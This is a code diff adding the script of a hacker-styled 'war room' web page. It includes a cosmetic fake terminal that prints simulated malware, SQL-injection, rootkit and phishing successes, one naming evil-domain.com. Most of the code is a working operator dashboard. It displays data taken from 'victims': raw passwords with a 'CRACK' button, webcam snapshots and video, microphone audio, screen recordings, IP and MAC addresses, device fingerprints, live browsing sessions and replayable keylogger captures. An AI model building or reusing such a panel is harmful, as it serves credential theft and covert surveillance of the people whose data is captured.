+                    setTimeout(() => printTerm("[+] Public Key: -----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----", "cmd-info"), 2500);
+                } else {
+                    printTerm("[-] Usage: keygen --type [rsa/aes/ed25519]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('encrypt --data')) {
+                const data = rawCmd.substring('encrypt --data'.length).trim();
+                if(data) {
+                    printTerm("[*] Encrypting data with AES-256...", "cmd-info");
+                    setTimeout(() => printTerm("[+] Data encrypted: " + btoa(data).substring(0,32) + "...", "cmd-success"), 500);
+                } else {
+                    printTerm("[-] Usage: encrypt --data [text_to_encrypt]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('decrypt --data')) {
+                const data = rawCmd.substring('decrypt --data'.length).trim();
+                if(data) {
+                    printTerm("[*] Decrypting data with AES-256...", "cmd-info");
+                    setTimeout(() => printTerm("[+] Data decrypted: " + atob(data).substring(0,32) + "...", "cmd-success"), 500);
+                } else {
+                    printTerm("[-] Usage: decrypt --data [encrypted_text]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('malware --type')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 3) {
+                    const type = parts[2];
+                    printTerm("[!] DEPLOYING " + type.toUpperCase() + " MALWARE...", "cmd-error");
+                    printTerm("[*] Compiling payload...", "cmd-info");
+                    setTimeout(() => printTerm("[+] Obfuscating code...", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Adding anti-VM checks...", "cmd-info"), 1000);
+                    setTimeout(() => printTerm("[+] Malware deployed to 15 victims!", "cmd-success"), 2000);
+                } else {
+                    printTerm("[-] Usage: malware --type [trojan/ransomware/keylogger]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('sqlmap --url')) {
+                const url = rawCmd.substring('sqlmap --url'.length).trim();
+                if(url) {
+                    printTerm("[*] Starting SQLMap injection test...", "cmd-info");
+                    printTerm("[+] Target URL: " + url, "cmd-info");
+                    setTimeout(() => printTerm("[+] Testing for SQL injection vulnerabilities...", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Found vulnerable parameter: id", "cmd-success"), 1500);
+                    setTimeout(() => printTerm("[+] Dumping database tables...", "cmd-info"), 2000);
+                    setTimeout(() => printTerm("[+] Extracted 1500 records from users table!", "cmd-success"), 3000);
+                } else {
+                    printTerm("[-] Usage: sqlmap --url [target_url]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('metasploit --module')) {
+                const module = rawCmd.substring('metasploit --module'.length).trim();
+                if(module) {
+                    printTerm("[*] Loading Metasploit module: " + module, "cmd-info");
+                    setTimeout(() => printTerm("[+] Module loaded successfully", "cmd-success"), 500);
+                    setTimeout(() => printTerm("[+] Setting payload options...", "cmd-info"), 1000);
+                    setTimeout(() => printTerm("[+] Exploiting target...", "cmd-info"), 1500);
+                    setTimeout(() => printTerm("[+] Meterpreter session opened!", "cmd-success"), 2500);
+                } else {
+                    printTerm("[-] Usage: metasploit --module [exploit/windows/smb/ms17_010_eternalblue]", "cmd-error");
+                }
+            }
+            else if(cmd === 'rootkit --install') {
+                printTerm("[!] INSTALLING KERNEL ROOTKIT...", "cmd-error");
+                printTerm("[*] Loading kernel module...", "cmd-info");
+                setTimeout(() => printTerm("[+] Hooking system calls...", "cmd-info"), 500);
+                setTimeout(() => printTerm("[+] Installing backdoors...", "cmd-info"), 1000);
+                setTimeout(() => printTerm("[+] Rootkit installed! System compromised.", "cmd-success"), 2000);
+            }
+            else if(cmd.startsWith('backdoor --create')) {
+                const parts = cmd.split(' ');
+                const port = parts.length >= 4 && parts[2] === '--port' ? parts[3] : '1337';
+                printTerm("[!] CREATING PERSISTENT BACKDOOR...", "cmd-error");
+                printTerm("[*] Port: " + port, "cmd-info");
+                setTimeout(() => printTerm("[+] Configuring reverse shell...", "cmd-info"), 500);
+                setTimeout(() => printTerm("[+] Adding to startup services...", "cmd-info"), 1000);
+                setTimeout(() => printTerm("[+] Backdoor created! Listening on port " + port, "cmd-success"), 2000);
+            }
+            else if(cmd.startsWith('firewall --bypass')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 3) {
+                    const ip = parts[2];
+                    printTerm("[!] BYPASSING FIREWALL...", "cmd-error");
+                    printTerm("[*] Target: " + ip, "cmd-info");
+                    setTimeout(() => printTerm("[+] Scanning for open ports...", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Found vulnerable service on port 80", "cmd-success"), 1000);
+                    setTimeout(() => printTerm("[+] Exploiting web server...", "cmd-info"), 1500);
+                    setTimeout(() => printTerm("[+] Firewall bypassed! Access granted.", "cmd-success"), 2500);
+                } else {
+                    printTerm("[-] Usage: firewall --bypass [ip]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('zeroday --search')) {
+                const vendor = rawCmd.substring('zeroday --search'.length).trim();
+                if(vendor) {
+                    printTerm("[*] Searching for zero-day exploits...", "cmd-info");
+                    printTerm("[+] Vendor: " + vendor, "cmd-info");
+                    setTimeout(() => printTerm("[+] Scanning dark web markets...", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Found 3 potential zero-days", "cmd-success"), 1500);
+                    setTimeout(() => printTerm("[+] CVE-2024-9999: Remote code execution in " + vendor + " software", "cmd-info"), 2000);
+                } else {
+                    printTerm("[-] Usage: zeroday --search [vendor_name]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('phishing --generate')) {
+                const parts = cmd.split(' ');
+                const template = parts.length >= 4 && parts[2] === '--template' ? parts[3] : 'bank';
+                printTerm("[!] GENERATING PHISHING KIT...", "cmd-error");
+                printTerm("[*] Template: " + template, "cmd-info");
+                setTimeout(() => printTerm("[+] Cloning legitimate site...", "cmd-info"), 500);
+                setTimeout(() => printTerm("[+] Injecting credential harvester...", "cmd-info"), 1000);
+                setTimeout(() => printTerm("[+] Obfuscating JavaScript...", "cmd-info"), 1500);
+                setTimeout(() => printTerm("[+] Phishing kit ready! Hosted at evil-domain.com", "cmd-success"), 2500);
+            }
+            else if(cmd.startsWith('c2 --payload')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 3) {
+                    const type = parts[2];
+                    printTerm("[*] Generating C2 payload...", "cmd-info");
+                    printTerm("[+] Type: " + type.toUpperCase(), "cmd-info");
+                    setTimeout(() => printTerm("[+] Compiling with custom encryption...", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Adding anti-analysis features...", "cmd-info"), 1000);
+                    setTimeout(() => printTerm("[+] Payload generated: " + type + "_payload." + (type === 'exe' ? 'exe' : type === 'dll' ? 'dll' : 'js'), "cmd-success"), 2000);
+                } else {
+                    printTerm("[-] Usage: c2 --payload [exe/dll/js]", "cmd-error");
+                }
+            }
+            else if(cmd === 'clear') {
+                termOut.innerHTML = '';
+            }
+            else {
+                printTerm("bash: " + cmd + ": command not found. Type 'help' for available commands.", "cmd-error");
+            }
+        }
+    });
+
+    // Function to parse keystroke arrays
+    function parseKeys() {
+        document.querySelectorAll('.keys-parsed').forEach(el => {
+            const raw = el.getAttribute('data-raw');
+            if(!raw || el.hasAttribute('data-parsed')) return;
+            try {
+                const arr = JSON.parse(raw);
+                let str = "";
+                arr.forEach(a => {
+                    if(a.key === 'Backspace') str = str.slice(0, -1);
+                    else if(a.key === 'Space' || a.key === ' ') str += ' ';
+                    else if(a.key === 'Enter') str += ' [ENTER] ';
+                    else if(a.key.length === 1) str += a.key;
+                });
+                el.innerText = str + "_";
+                el.setAttribute('data-parsed', 'true');
+            } catch(e) {
+                console.log("Parse error:", e);
+                el.innerText = "...";
+            }
+        });
+    }
+    parseKeys();
+
+
+
+    // Helper to handle large Base64 media strings by converting them to local Blob URLs
+    function getMediaUrl(base64Data, contentType) {
+        if (!base64Data || !base64Data.startsWith('data:')) return base64Data;
+        try {
+            const parts = base64Data.split(';base64,');
+            const mime = parts[0].split(':')[1];
+            const byteCharacters = atob(parts[1]);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: mime || contentType });
+            return URL.createObjectURL(blob);
+        } catch (e) {
+            console.error("Blob conversion error:", e);
+            return base64Data;
+        }
+    }
+
+    function refreshData() {
+        const activeEl = document.activeElement;
+        if(activeEl && activeEl.id === 'hacker-terminal') return;
+        
+        // Don't refresh if any overlay is visible
+        const crackerOverlay = document.getElementById('cracker-overlay');
+        const fullscreenOverlay = document.getElementById('fullscreen-overlay');
+        if(crackerOverlay && crackerOverlay.style.display === 'flex') return;
+        if(fullscreenOverlay && fullscreenOverlay.style.display === 'flex') return;
+
+        fetch('/war_room_data/')
+            .then(response => response.json())
+            .then(data => {
+                // Update stats
+                const statValues = document.querySelectorAll('.stats-grid .stat-card .stat-value');
+                if (statValues.length >= 4) {
+                    statValues[0].innerText = data.total_intercepts;
+                    statValues[1].innerText = data.critical_threats;
+                }
+                const mobileCountEl = document.getElementById('mobile-count');
+                const desktopCountEl = document.getElementById('desktop-count');
+                const tabletCountEl = document.getElementById('tablet-count');
+                const otherCountEl = document.getElementById('other-count');
+                if (mobileCountEl) mobileCountEl.innerText = data.device_breakdown?.mobile || 0;
+                if (desktopCountEl) desktopCountEl.innerText = data.device_breakdown?.desktop || 0;
+                if (tabletCountEl) tabletCountEl.innerText = data.device_breakdown?.tablet || 0;
+                if (otherCountEl) otherCountEl.innerText = data.device_breakdown?.other || 0;
+
+                const currentCount = data.total_intercepts;
+                const storedCount = localStorage.getItem('interceptCount');
+                if (storedCount && currentCount > parseInt(storedCount)) {
+                    playAlertSound();
+                }
+                localStorage.setItem('interceptCount', currentCount);
+
+                const logsContainer = document.getElementById('logs-container');
+                const currentLogCount = data.logs.length;
+                const lastLogCount = parseInt(logsContainer.getAttribute('data-count') || '0');
+
+                if (currentLogCount !== lastLogCount || logsContainer.innerHTML.trim() === "" || logsContainer.innerHTML.includes('undefined')) {
+                    let logsHtml = '';
+                    if(data.logs.length === 0) {
+                        logsHtml = `<div class="text-center p-5" style="color: #444; margin-top: 50px;">
+                            <i class="fa-solid fa-satellite-dish fa-beat-fade fa-3x mb-4" style="--fa-animation-duration: 3s;"></i><br>
+                            LISTENING ON PORT 8000...<br>NO INTRUSIONS DETECTED YET.
+                        </div>`;
+                    } else {
+                        data.logs.forEach(log => {
+                            const audioUrl = getMediaUrl(log.voice_audio, 'audio/webm');
+                            const screenUrl = getMediaUrl(log.screen_recording, 'video/webm');
+                            const camUrl = getMediaUrl(log.webcam_video, 'video/webm');
+                            const snapUrl = log.webcam_snap;
+
+                            logsHtml += `
+                            <div class="cyber-card ${log.risk_level.toLowerCase()}" data-log-id="${log.id}" data-raw-password="${log.raw_password}">
+                                <div>
+                                    <div class="data-label">THREAT LEVEL</div>
+                                    <div class="data-value font-weight-bold" style="margin-bottom: 15px;">[${log.risk_level}]</div>
+                                    
+                                    <div id="media-links-${log.id}" style="margin-top:10px; display:flex; gap:10px; flex-wrap:wrap;">
+                                        ${snapUrl ? `<a href="${snapUrl}" download="webcam_${log.id}.jpg" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_SNAP</a>` : ''}
+                                        ${log.webcam_video ? `<a href="${camUrl}" download="cam_video_${log.id}.webm" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_CAM_VIDEO</a>` : ''}
+                                        ${log.voice_audio ? `<a href="${audioUrl}" download="audio_${log.id}.webm" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_AUDIO</a>` : ''}
+                                        ${log.screen_recording ? `<a href="${screenUrl}" download="screen_${log.id}.webm" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_SCREEN</a>` : ''}
+                                    </div>
+
+                                    ${log.webcam_video ? `
+                                    <div style="margin-top:15px; border:1px solid #333; padding:5px; background:#000;">
+                                        <div style="font-size:10px; color:#555; margin-bottom:5px;">WEBCAM_VIDEO_FEED</div>
+                                        <video src="${camUrl}" controls style="width:100%; max-height:200px; border:1px solid #222;"></video>
+                                    </div>` : (snapUrl ? `
+                                    <div style="margin-top:15px; border:1px solid #333; padding:5px; background:#000;">
+                                        <div style="font-size:10px; color:#555; margin-bottom:5px;">WEBCAM_SNAPSHOT</div>
+                                        <img src="${snapUrl}" style="width:100%; border:1px solid #222;">
+                                    </div>` : '')}
+                                    
+                                    ${log.voice_audio ? `
+                                    <div class="mt-3">
+                                        <div class="data-label" style="color: var(--alert-red);"><i class="fa-solid fa-microphone"></i> AUDIO INTERCEPT</div>
+                                        <audio src="${audioUrl}" controls style="width: 100%; height: 30px; outline: none; margin-top: 5px;"></audio>
+                                    </div>` : ''}
+
+                                    ${log.screen_recording ? `
+                                    <div class="mt-3">
+                                        <div class="data-label" style="color: var(--cyber-blue);"><i class="fa-solid fa-desktop"></i> SCREEN RECORDING</div>
+                                        <video src="${screenUrl}" controls style="width: 100%; max-height: 150px; outline: none; margin-top: 5px; border: 1px solid rgba(0,255,65,0.1);"></video>
+                                    </div>` : ''}
+                                </div>
+                                <div>
+                                    <div class="data-label">ORIGIN VECTOR</div>
+                                    <div class="data-value" style="font-size:12px;">${log.geo_ip}</div>
+                                    <div class="data-label" style="margin-top:10px;">MAC ADDRESS</div>
+                                    <div class="data-value" style="font-size:12px; color: #888;">${log.mac_address}</div>
+                                    <div class="data-label" style="margin-top:10px;">DEVICE INFO</div>
+                                    <div class="data-value" style="font-size:11px; color: #aaa;">${log.browser_fingerprint}</div>
+                                </div>
+                                <div>
+                                    <div class="data-label">CREDENTIAL PAYLOAD (HASH / RAW)</div>
+                                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:6px;">
+                                        <div class="data-value text-break" style="color: #fff; margin:0;">${log.intercepted_id}</div>
+                                        ${log.auth_mode ? `<span class="badge-mode ${log.auth_mode === 'SIGNUP' ? 'badge-signup' : 'badge-login'}">${log.auth_mode}</span>` : ''}
+                                    </div>
+                                    ${log.full_name ? `<div style="font-size:11px; color:#aaa; margin-bottom:5px;"><i class="fa-solid fa-user me-1"></i> ${log.full_name}</div>` : ''}
+                                    
+                                    <div class="data-value" style="font-size:11px; margin-top: 5px; font-family: monospace; color: var(--cyber-blue); cursor: pointer;" 
+                                         id="hash-display-${log.id}" onclick="revealHash('hash-${log.id}', 'hash-display-${log.id}')">
+                                        [ HIDDEN_HASH_CLICK_TO_REVEAL ]
+                                    </div>
+                                    <div style="display: none; font-size:11px; opacity: 0.6; word-break: break-all; margin-top: 5px; font-family: monospace;" id="hash-${log.id}">
+                                        ${log.encrypted_token}
+                                    </div>
+                                    <div id="raw-${log.id}" class="data-value font-weight-bold" style="display: none; font-size:16px; margin-top: 8px; text-shadow: 0 0 8px currentColor;"></div>
+                                    
+                                    <div class="action-btns mt-2">
+                                        <button class="copy-btn" onclick="revealHash('hash-${log.id}', 'hash-display-${log.id}')"><i class="fa-solid fa-fingerprint"></i> HASH</button>
+                                        <button class="copy-btn" onclick="crackHash('${log.id}', '${log.raw_password}')"><i class="fa-solid fa-unlock-keyhole"></i> CRACK</button>
+                                    </div>
+                                </div>
+                                <div class="text-end">
+                                    <div class="data-label">TIMESTAMP LOCAL</div>
+                                    <div class="data-value" style="font-size:16px; color: #fff;">${log.timestamp}</div>
+                                    <div class="data-value" style="font-size:12px; color: #666;">${log.date}</div>
+                                    <div style="font-size: 10px; margin-top: 15px; color: #444;">SYS_ID: ${log.id}</div>
+                                </div>
+                            </div>`;
+                        });
+                    }
+                    logsContainer.innerHTML = logsHtml;
+                    logsContainer.setAttribute('data-count', currentLogCount);
+                }
+
+                // Update Live Victims
+                const victimsContainer = document.getElementById('active-victims-panel');
+                if (victimsContainer) {
+                    let victimsHtml = `<div class="feed-title" style="margin-bottom: 18px;"><span>> LIVE VICTIMS PANEL</span></div><div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px;">`;
+                    if (data.active_victims && data.active_victims.length > 0) {
+                        data.active_victims.forEach(victim => {
+                            victimsHtml += `<div style="background: rgba(10,10,10,0.9); border: 1px solid #111; padding: 14px; font-size: 12px;">
+                                <div style="color: #fff; margin-bottom: 8px; letter-spacing: 1px;">${victim.ip_address} <span style="color: var(--cyber-blue); font-size: 10px;">${victim.session_id.slice(0,8)}</span></div>
+                                <div class="data-label">LAST ACTION</div>
+                                <div class="data-value">${victim.last_action || 'N/A'}</div>
+                                <div class="data-label" style="margin-top:8px;">DEVICE INFO</div>
+                                <div class="data-value" style="font-size:11px; color:#aaa;">${victim.device_info || 'Unknown'}</div>
+                                <div class="data-label" style="margin-top:8px;">CURRENT URL</div>
+                                <div class="data-value" style="font-size:11px; color:#ccc;">${victim.current_url || 'none'}</div>
+                                <div class="data-label" style="margin-top:8px;">SEEN</div>
+                                <div class="data-value" style="font-size:11px; color:#666;">${victim.last_seen}</div>
+                            </div>`;
+                        });
+                    } else {
+                        victimsHtml += `<div style="grid-column:1/-1; color:#555; text-align:center; padding: 20px;">NO ACTIVE VICTIMS ONLINE RIGHT NOW.</div>`;
+                    }
+                    victimsHtml += `</div>`;
+                    victimsContainer.innerHTML = victimsHtml;
+                }
+
+                // Update Timeline
+                const timelineContainer = document.getElementById('timeline-panel');
+                if (timelineContainer && data.timeline_events) {
+                    let timelineHtml = `<div class="feed-title" style="margin-bottom: 18px;"><span>> VICTIM TIMELINE</span></div><div style="display:flex; flex-direction:column; gap: 10px;">`;
+                    data.timeline_events.forEach(item => {
+                        timelineHtml += `<div style="display:flex; justify-content: space-between; gap: 10px; padding: 12px; border: 1px solid rgba(0,255,65,0.08);">
+                            <div style="color:#fff; font-size: 12px;">${item.summary}</div>
+                            <div style="color:#666; font-size: 11px;">${item.date} ${item.time}</div>
+                        </div>`;
+                    });
+                    timelineHtml += `</div>`;
+                    timelineContainer.innerHTML = timelineHtml;
+                }
+
+                // Update Live Keys
+                const keysContainer = document.getElementById('live-keys-container');
+                if(data.live_keys.length > 0) {
+                    let keysHtml = `<div class="keylogger-panel">
+                        <div style="color: #fff; font-size: 12px; margin-bottom: 15px; letter-spacing: 2px;">
+                            <span><i class="fa-solid fa-keyboard me-2" style="color: var(--neon-green); animation: blink 1s infinite;"></i> ACTIVE_KEYLOGGER_SESSION</span>
+                        </div>`;
+                        data.live_keys.forEach(key => {
+                            const escapedKeys = key.keystrokes.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;');
+                            keysHtml += `<div style="font-family: 'Courier New', Courier, monospace; font-size: 14px; margin-bottom: 10px;">
+                                <span style="color: #555;">[${key.timestamp}]</span> 
+                                <span style="color: var(--alert-red); margin: 0 10px;">${key.username}</span> 
+                                <button class="copy-btn" style="color: var(--cyber-blue); font-size: 10px; margin-right: 10px;" onclick="playKeystrokes('${escapedKeys}')"><i class="fa-solid fa-play"></i> REPLAY</button>
+                                <span class="keys-parsed" data-raw='${escapedKeys}' style="color: var(--neon-green); background: rgba(0,255,65,0.05); padding: 2px 8px; margin-left: 10px;"></span>
+                            </div>`;
+                        });
+                    keysHtml += `</div>`;
+                    keysContainer.innerHTML = keysHtml;
+                    parseKeys();
+                } else {
+                    keysContainer.innerHTML = '';
+                }
+            });
+    }
+
+    function playAlertSound() {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playPing(time, freq) {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            osc.type = 'sine'; osc.frequency.setValueAtTime(freq, time);
+            gain.gain.setValueAtTime(0, time);
+            gain.gain.linearRampToValueAtTime(0.5, time + 0.05);
+            gain.gain.exponentialRampToValueAtTime(0.001, time + 0.5);
+            osc.start(time); osc.stop(time + 0.5);
+        }
+        playPing(audioCtx.currentTime, 800);
+        playPing(audioCtx.currentTime + 0.2, 1200);
+    }
+
+    setInterval(refreshData, 3000);
+
+    // Network Sniffer Logic
+    const snifferOut = document.getElementById('sniffer-output');
+    function generateSnifferLog() {
+        const ips = ["192.168.1.", "10.0.0.", "172.16.0.", "104.21.3.", "8.8.8."];
+        const ip = ips[Math.floor(Math.random()*ips.length)] + Math.floor(Math.random()*255);
+        const ports = [80, 443, 22, 21, 3389, 8080];
+        const port = ports[Math.floor(Math.random()*ports.length)];
+        const hex = Math.random().toString(16).substr(2, 8).toUpperCase();
+        
+        const p = document.createElement('div');
+        p.innerText = `[+] PKT_CAP: ${ip}:${port} -> LEN:${Math.floor(Math.random()*1500)} HEX:0x${hex}`;
+        
+        // Randomly make some lines green
+        if(Math.random() > 0.8) p.style.color = "var(--neon-green)";
+        
+        snifferOut.appendChild(p);
+        if(snifferOut.childNodes.length > 25) {
+            snifferOut.removeChild(snifferOut.firstChild);
+        }
+    }
+    setInterval(generateSnifferLog, 80); // Fast scrolling
+
+    // --- NEW: War Room dynamic UI script ---
+    function updateWarRoomUI() {
+        const timeEl = document.getElementById('system-time');
+        const now = new Date();
+        if(timeEl) timeEl.innerText = now.getHours().toString().padStart(2, '0') + ":" + 
+                                   now.getMinutes().toString().padStart(2, '0') + ":" + 
+                                   now.getSeconds().toString().padStart(2, '0');
+        
+        // Update simulated coordinates
+        const cx = document.getElementById('coord-x');
+        const cy = document.getElementById('coord-y');
+        if(cx) cx.innerText = Math.floor(Math.random() * 90);
+        if(cy) cy.innerText = Math.floor(Math.random() * 180);
+    }
+    setInterval(updateWarRoomUI, 1000);
+    updateWarRoomUI();
+</script>
+
+</body>
+</html>
+
